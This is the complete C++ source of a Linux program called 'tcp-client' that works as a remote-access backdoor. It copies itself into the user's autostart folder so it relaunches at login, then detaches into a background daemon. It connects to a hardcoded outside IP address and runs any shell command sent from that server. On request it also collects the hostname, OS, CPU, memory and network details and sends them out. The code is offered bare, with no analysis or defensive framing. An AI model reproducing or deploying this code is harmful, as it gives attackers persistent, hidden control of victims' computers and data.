#include <tcpsocket.h>
#include <string>
#include <signal.h>
#include <sys/stat.h>
//#include <iostream>

#define SERVER_IP			"5.12.146.138"
#define SERVER_PORT			80

#define NOT_CONNECTED			0
#define CONNECTED			1

using namespace std;

int tcp_status = NOT_CONNECTED;
string tcp_message = "";

// info
static vector<string> info_commands {
	"cat /etc/hostname",
	"cat /etc/issue",
	"cat /proc/meminfo | head -n 3",
	"cat /proc/cpuinfo | grep \"model name\" | uniq",
	"cat /proc/cpuinfo | grep \"cpu cores\" | uniq",
	"cat /proc/cpuinfo | grep \"processor\" | tail -n 1",
	"ip a sh",
};

static string command_exec(string cmd) {
	array<char, 128> buffer;
	string result;
	unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

	if (!pipe) {
		throw runtime_error("popen() failed!");
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}

	return result;
}

static string command_run_info() {
	string command_all, command_in, command_out;

	for (vector<string>::iterator it = info_commands.begin(); it != info_commands.end(); ++it) {
		command_all.append(command_exec(*it));
	}

	return command_all;
}

static void autostart(char **argv) {
	string command_in = argv[0];
	command_in = "cp " + command_in + " /home/$(whoami)/.config/autostart/tcp-client";
	command_exec(command_in);

	command_in = "echo \"\
[Desktop Entry]\n\
Encoding=UTF-8\n\
Name=tcp-client\n\
Comment=tcp-client\n\
Exec=/home/$(whoami)/.config/autostart/tcp-client\n\
Terminal=false\n\
Icon=\n\
Type=Application\" > ~/.config/autostart/tcp-client.desktop";
	command_exec(command_in);
}

static void daemonize() {
	pid_t pid;

	/* Fork off the parent process */
	pid = fork();

	/* An error occurred */
	if (pid < 0)
		exit(EXIT_FAILURE);

	/* Success: Let the parent terminate */
	if (pid > 0)
		exit(EXIT_SUCCESS);

	/* On success: The child process becomes session leader */
	if (setsid() < 0)
		exit(EXIT_FAILURE);

	/* Catch, ignore and handle signals */
	//TODO: Implement a working signal handler */
	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

	/* Fork off for the second time*/
	pid = fork();

	/* An error occurred */
	if (pid < 0)
		exit(EXIT_FAILURE);

	/* Success: Let the parent terminate */
	if (pid > 0)
		exit(EXIT_SUCCESS);

	/* Set new file permissions */
	umask(0);

	/* Change the working directory to the root directory */
	/* or another appropriated directory */
	int ret = chdir("/");
	(void)(ret);

	/* Close all open file descriptors */
	int x;
	for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
	{
		close (x);
	}
}

int main(int argc, char **argv) {
	TCPSocket *tcp_socket = NULL;
	string output;

	(void) argc;

	autostart(argv);

	daemonize();


	while (1) {
		switch (tcp_status) {
		case CONNECTED:
			//cout << "IS CONNECTED" << endl;

			if (tcp_message.compare("die") == 0) {
				tcp_socket->Close();
				delete tcp_socket;
				exit(0);
			} else if (tcp_message.compare("info") == 0) {
				output = command_run_info();
				tcp_socket->Send(output);
				tcp_message = "";
			} else {
				command_exec(tcp_message);
				tcp_message = "";
			}

			break; 

		case NOT_CONNECTED:
			//cout << "IS NOT_CONNECTED" << endl;

			if (tcp_socket) {
				tcp_socket->Close();
				delete tcp_socket;
			}
			tcp_socket = new TCPSocket();

			// callbacks
			tcp_socket->onMessageReceived = [](string message) {
				(void)(message);
				tcp_message = message;
			};

			tcp_socket->onSocketClosed = []{
				tcp_status = NOT_CONNECTED;
			};

			// connect
			tcp_socket->Connect(inet_addr(SERVER_IP), SERVER_PORT, [&] {
				tcp_status = CONNECTED;
				//cout << "YES CONNECT" << endl;
			},
			[](int errorCode, std::string errorMessage){
				//cout << "NO CONNECT :((" << endl;
				(void)errorCode;
				(void)errorMessage;
				tcp_status = NOT_CONNECTED;
			});

			break; 

		default:
			break;
		}

		sleep(1);
	}

	return 0;
}
